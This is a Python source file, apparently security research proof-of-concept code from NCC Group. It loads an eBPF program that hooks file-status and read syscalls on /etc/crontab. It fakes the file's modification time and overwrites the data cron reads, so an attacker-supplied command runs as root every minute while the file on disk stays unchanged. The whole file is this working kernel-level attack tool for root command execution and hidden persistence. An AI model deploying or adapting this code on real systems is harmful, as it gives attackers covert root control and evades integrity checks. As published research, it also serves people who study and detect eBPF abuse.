# Copyright (c) 2018 NCC Group Security Services, Inc. All rights reserved.
# Licensed under Dual BSD/GPLv2 per the repo LICENSE file.

from __future__ import absolute_import, division, print_function, unicode_literals
from bcc import BPF
import ctypes
import sys
import time

text = """
#include <bcc/proto.h>
#include <linux/socket.h>
#include <linux/uio.h>
#include <linux/skbuff.h>
#include <linux/pid.h>
#include <net/af_unix.h>

#define UINT8_MAX (255)
#define UINT32_MAX (4294967295UL)

typedef struct notify {
  uint8_t data[128];
} notify_t;
BPF_PERF_OUTPUT(output);

inline static void notify(notify_t* n, struct pt_regs* ctx) {
  output.perf_submit(ctx, n, sizeof(notify_t));
}
  /*notify_t n;
  #pragma unroll
  for (size_t i = 0; i < sizeof(n.data); i++) {
    n.data[i] = 0;
  }
  notify(&n, ctx);*/

static inline int is_crontab(char const __user* pathname) {
  char const key[] = "/etc/crontab";
  char const path[sizeof(key)];;
  bpf_probe_read((char*)&path, sizeof(path), pathname);

  #pragma unroll
  for (size_t i=0; i<sizeof(key); i++) {
    char c = path[i];
    if (key[i] != c) {
      return 0;
    }
  }
  return 1;
}

struct starttime {
  u64 time;
};
BPF_PERCPU_ARRAY(time_buf, struct starttime, 1);

static inline void bump_stat(struct stat __user* statbuf) {
  u64 t = """ + str(int(time.time())) + """;
  struct starttime* st = NULL;
  int key = 0;
  st = time_buf.lookup(&key);
  if (!st) {
    return;
  }
  if (st->time == 0) {
    st->time = bpf_ktime_get_ns();
  }

  u64 currtime = bpf_ktime_get_ns();
  u64 diff = currtime - st->time;
  u64 ds = diff / 1000000000;

  time_t ts = t + ds;

  time_t st_atime = ts;
  time_t st_mtime = ts;
  time_t st_ctime = ts;

  //time_t* at = &statbuf->st_atime;
  time_t* mt = &statbuf->st_mtime;
  //time_t* ct = &statbuf->st_ctime;

  int r = 0;
  //r = bpf_probe_write_user(at, &st_atime, sizeof(st_atime));
  r = bpf_probe_write_user(mt, &st_mtime, sizeof(st_mtime));
  //r = bpf_probe_write_user(ct, &st_ctime, sizeof(st_ctime));

  //bpf_trace_printk("write status: %d\\n", r);
}

BPF_HASH(hookstat, u64, struct stat __user*);

int kprobe__sys_newstat(
    struct pt_regs *ctx,
    char const __user* pathname,
    struct stat __user* statbuf) {
  if (statbuf == NULL || pathname == NULL) {
    return 0;
  }

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  if (is_crontab(pathname)) {
    hookstat.update(&pid, &statbuf);
  }
  return 0;
}

int kretprobe__sys_newstat(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  struct stat** statbuf_p;
  statbuf_p = hookstat.lookup(&pid);
  if (!statbuf_p) {
    return 0;
  }
  struct stat __user* statbuf = *statbuf_p;

  bump_stat(statbuf);
  hookstat.delete(&pid);

  return 0;
}

BPF_HASH(hookopenat, u64, u64);

int kprobe__sys_openat(struct pt_regs *ctx,
    int dirfd, char const __user* pathname, int flags) {

  if (dirfd != AT_FDCWD || pathname == NULL || flags != O_RDONLY) {
    return 0;
  }

  if (is_crontab(pathname)) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 pid = (u32)(pid_tgid >> 32);
    hookopenat.update(&pid, &pid);
  }
  return 0;
}

BPF_HASH(fdmap, u64, u64);

int kretprobe__sys_openat(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  u64* p;
  p = hookopenat.lookup(&pid);
  if (!p) {
    return 0;
  }

  int ret = PT_REGS_RC(ctx);
  if (ret > 0) {
    u64 kv = (((u64)ret) << 32) ^ pid;
    bpf_trace_printk("hooking open: %lx\\n", kv);
    fdmap.update(&kv, &kv);
    hookopenat.delete(&pid);
  }
  return 0;
}

int kprobe__sys_close(
    struct pt_regs *ctx,
    int fd) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);
  u64 kv = (((u64)fd) << 32) ^ pid;

  u64* p;
  p = fdmap.lookup(&kv);
  if (p) {
    fdmap.delete(&kv);
  }
  return 0;
}

BPF_HASH(hookfstat, u64, struct stat __user*);

int kprobe__sys_newfstat(struct pt_regs *ctx,
    int fd, struct stat __user* statbuf) {

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);
  u64 kv = (((u64)fd) << 32) ^ pid;

  u64* p;
  p = fdmap.lookup(&kv);
  if (p) {
    hookfstat.update(&pid, &statbuf);
  }

  return 0;
}

int kretprobe__sys_newfstat(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  struct stat** statbuf_p;
  statbuf_p = hookfstat.lookup(&pid);
  if (!statbuf_p) {
    return 0;
  }

  struct stat __user* statbuf = *statbuf_p;

  bump_stat(statbuf);
  hookfstat.delete(&pid);

  return 0;
}

BPF_HASH(hooklstat, u64, struct stat __user*);

int kprobe__sys_newlstat(
    struct pt_regs *ctx,
    char const __user* pathname,
    struct stat __user* statbuf) {
  if (statbuf == NULL || pathname == NULL) {
    return 0;
  }

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  if (is_crontab(pathname)) {
    hooklstat.update(&pid, &statbuf);
  }
  return 0;
}

int kretprobe__sys_newlstat(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  struct stat** statbuf_p;
  statbuf_p = hooklstat.lookup(&pid);
  if (!statbuf_p) {
    return 0;
  }

  struct stat __user* statbuf = *statbuf_p;

  bump_stat(statbuf);
  hooklstat.delete(&pid);

  return 0;
}


BPF_HASH(hookread, u64, char*);

int kprobe__sys_read(struct pt_regs *ctx,
    int fd, void *buf, size_t count) {

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);
  u64 kv = (((u64)fd) << 32) ^ pid;

  u64* p;
  p = fdmap.lookup(&kv);
  if (p) {
    hookread.update(&pid, (char**)&buf);
  }

  return 0;
}

int kretprobe__sys_read(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  char** bufp = NULL;
  bufp = hookread.lookup(&pid);
  if (!bufp) {
    return 0;
  }
  int ret = PT_REGS_RC(ctx);
  char __user* buf = *bufp;

  //char payload[] = "SHELL=/bin/sh\\n* * * * * root /usr/bin/id > /tmp/myebpfid\\n#";
  char payload[] = "SHELL=/bin/sh\\n* * * * * root """ + sys.argv[1] + """\\n#";

  if (ret > 0 && (sizeof(payload)-1) < ret) {
    char orig[4];
    bpf_probe_read(&orig, 4, buf);
    orig[3] = (char)0;
    //if (orig[0] == '#') {
      //bpf_trace_printk("feeding evil data");
      bpf_probe_write_user(buf, &payload, sizeof(payload)-1);
    //}
  }

  hookread.delete(&pid);

  return 0;
}

"""


class notify_t(ctypes.Structure):
  _fields_ = [
    ("data", ctypes.c_uint8*128),
  ]

def handle_event(cpu, data, size):
  try:
    notify = ctypes.cast(data, ctypes.POINTER(notify_t)).contents
    print(repr(notify))

  except KeyboardInterrupt:
    sys.exit(0)

#b = BPF(text=text).trace_print()
b = BPF(text=text, debug=0x8)
#b = BPF(text=text)

b["output"].open_perf_buffer(handle_event)

b.trace_print()
